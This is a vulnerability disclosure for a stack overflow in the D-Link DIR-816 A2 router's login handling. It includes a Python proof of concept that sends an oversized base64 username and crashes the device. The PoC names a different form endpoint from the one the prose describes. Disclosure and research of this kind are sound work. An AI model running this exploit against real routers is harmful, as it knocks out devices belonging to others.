# D-Link DIR-816 A2 stack_overflow

**Vender**: D-Link

**Firmware version**: 1.10 B05

**Vendor Homepage**: http://www.dlink.com.cn/

**Hardware Link**: http://support.dlink.com.cn:9000/ProductInfo.aspx?m=DIR-816

**Exploit Author**: [SkYe231](mailto:skye231@foxmail.com)

## detail

In the handler of route `/goform/dir_login`, the value of parameter `username` is base64 decoded and the result is saved on the stack:

![20210420002509](20210420002509.png)

However, there's no check on length of the `username` , and a very long input could lead to stack overflow and overwrite the return address.

## POC

> After running POC, the router will **crash**.

```python
# coding=utf-8
import requests
import re
import base64

ip = "192.168.0.1"
payload = base64.b64encode('a'*0x150)
print(len(payload))

print("[+]Get tokenid")
url = "http://{}/dir_login.asp".format(ip)
rsp = requests.get(url)

pattern = re.compile(r'name="tokenid"  value="\d+"')
result = pattern.findall(rsp.text)
tokenid = result[0].split('value="')[-1].strip('"')
print("[+]tokenid:{}".format(tokenid))

url = "http://{}/goform/form2userconfig.cgi".format(ip)
data = {"username": payload, "newpass": '', "tokenid": tokenid}
try:
    requests.post(url, data=data, allow_redirects=False, timeout=1)
except:
    pass
print("[+]DIR816 Crash")
```

<video src="验证视频.mp4"></video>

